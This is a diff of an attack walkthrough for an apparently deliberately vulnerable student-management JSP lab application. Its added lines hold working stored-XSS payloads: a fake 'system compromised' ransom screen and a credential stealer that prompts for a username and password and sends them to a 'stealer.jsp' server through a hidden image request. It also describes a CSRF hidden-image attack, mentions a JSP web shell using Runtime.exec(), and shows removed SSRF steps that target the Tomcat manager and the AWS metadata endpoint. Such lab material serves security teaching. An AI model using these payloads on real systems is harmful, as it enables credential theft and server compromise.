@@ -118,8 +118,8 @@ Plant a permanent malicious script in the database that will execute on the comp
    <script>document.body.innerHTML=`<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:9999;display:flex;justify-content:center;align-items:center;font-size:50px;font-family:monospace;text-align:center;">SYSTEM COMPROMISED<br>ALL DATA ENCRYPTED</div>`;</script>
 
    Payload 2: The "Silent Data Stealer" (Phishing & Exfiltration)
-   Pops up a fake login prompt. When the user types their password, it silently sends it to the hacker's server (stealer.jsp) using an invisible image request.
-   <script>let p=prompt("Connection Interrupted. Please re-enter your password to reconnect:"); if(p) { let img = new Image(); img.src = "stealer.jsp?data=" + encodeURIComponent(p); alert("Reconnected Successfully."); }</script>
+   Pops up fake login prompts. When the user types their credentials, it silently sends them to the hacker's server (stealer.jsp) using an invisible image request.
+   <script>let u=prompt("Connection Interrupted. Re-enter Username:"); if(u){let p=prompt("Enter Password:"); if(p){let img = new Image(); img.src = "stealer.jsp?data=" + encodeURIComponent("Username: " + u + " | Password: " + p); alert("Reconnected Successfully.");}}</script>
 
 6. Click Submit to save it to the database.
 7. Now, log out and go to the public homepage (index.jsp).
@@ -246,24 +246,24 @@ In upload_profile.jsp, the application allows users to upload a profile picture 
 * Why it works:
 The server blindly saves and executes the .jsp file instead of treating it as a static image. By using Runtime.exec(), we bridge the gap between the web application and the underlying Operating System, granting the attacker full control of the computer.
 
-
-ATTACK 13: Server-Side Request Forgery (SSRF) (A10:2021)
+ATTACK 13: Cross-Site Request Forgery (CSRF)
 --------------------------------------------------------
-* The Vulnerability: 
-On the Admin Announcements page (admin_announcements.jsp), there is an "Attach Link Preview" feature. It takes a URL provided by the Admin and forces the Java backend to fetch that URL's content using HttpURLConnection.
+**The Vulnerability:** 
+In the vulnerable application, the Delete Announcement action on the admin_announcements.jsp page is implemented using a simple GET request without any CSRF tokens (admin?action=delete_announcement&id=X). Because it uses GET and lacks tokens, an external malicious website can force an admin's browser to make this request silently in the background.
 
-* The Goal:
-Force the backend server to read its own highly sensitive internal configuration files and post them to the public notice board.
+**The Goal:**
+Trick the Admin into visiting a malicious webpage, which will silently force the Admin's browser to delete an important announcement from the portal without their knowledge.
 
-* The Steps:
-1. Log in as an Admin and navigate to the Manage Announcements page.
-2. In the Title field, type: Server Config Leak
-3. In the Content field, type: Here is our internal config:
-4. In the Attach Link Preview field, type exactly this URL: 
-   http://localhost:8080/manager/html or http://localhost:8080/manager/status
-   (Or if hosting on AWS, use the metadata endpoint: http://169.254.169.254/latest/meta-data/)
-5. Click Post Announcement.
-6. The Result: Look at the resulting announcement. Below your text, the server has printed out the raw HTML source code of the Tomcat Manager dashboard, which is usually firewalled off from public internet users.
+**The Steps:**
+1. Log into the vulnerable system as the Admin. Let the tab remain open.
+2. Go to Manage Announcements and identify an announcement. Note its ID (e.g., hover over the Delete button and see id=4). Let's assume the ID is 4 for this example.
+3. Open the Hacker's C2 Server panel in a separate browser tab: http://localhost:8080/student-management-system/stealer.jsp
+4. In the stealer.jsp code (or any other HTML page), the attacker embeds a hidden image tag:
+   <img src="http://localhost:8080/student-management-system/admin?action=delete_announcement&id=4" style="display:none;" />
+   *(Alternatively, just open a new tab and paste that URL to simulate the malicious site loading it).*
+5. The moment the malicious page loads, the browser automatically tries to load the "image" by making a GET request to that URL. 
+6. Because the Admin is already logged in on the first tab, the browser attaches their session cookies to the request.
+7. The Result: Go back to the Admin Announcements page and refresh. Announcement #4 has been silently deleted!
 
 * Why it works:
-The server blindly trusts the URL provided by the user. An external attacker cannot access localhost:8080/manager from the outside internet because of firewalls. However, by exploiting SSRF, the attacker forces the server itself to make the request from the inside, bypassing the firewall to read internal documents, admin panels, or cloud secrets.
+The server cannot distinguish between a legitimate request made by the Admin clicking the "Delete" button, and a forged request made automatically by a malicious script/image tag on a different website. Because the session cookie is sent automatically, the server assumes the Admin authorized the deletion.y.
